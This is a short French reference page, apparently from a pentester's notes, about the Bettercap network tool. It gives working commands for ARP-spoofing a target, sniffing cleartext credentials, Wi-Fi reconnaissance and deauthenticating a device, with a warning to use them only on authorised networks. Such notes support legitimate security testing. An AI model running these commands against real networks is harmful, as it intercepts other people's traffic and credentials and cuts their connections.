---
titre: "Bettercap"
tags: [Outils, réseau, MITM, WiFi, sniffing]
source: https://github.com/bettercap/bettercap
---

# Bettercap

**Couteau suisse des attaques réseau / MITM.** Va au-delà du Wi-Fi : spoofing ARP,
sniffing de credentials, manipulation HTTP(S), plus des modules Wi-Fi (recon,
déauth) et BLE. Piloté par modules + interface web.

> ⚠️ MITM = interception de trafic réel : **réseau autorisé uniquement**. Cf. `README`.

## Installation
```bash
sudo apt install bettercap
```

## Exemples
```bash
# MITM ARP + sniff sur le LAN
sudo bettercap -iface eth0
> net.probe on
> set arp.spoof.targets 10.0.0.20
> arp.spoof on
> net.sniff on            # capture identifiants en clair
# reconnaissance Wi-Fi
sudo bettercap -iface wlan0mon
> wifi.recon on
> wifi.deauth AA:BB:CC:DD:EE:FF
# interface web
sudo bettercap -caplet http-ui
```

## Réflexe
Puissant mais bruyant/intrusif : réservé aux labs et engagements. Pour l'audit
Wi-Fi « cassage de clé », rester sur [[aircrack-ng]]/[[Wifite]] ; Bettercap brille
pour le **MITM** une fois sur le réseau.
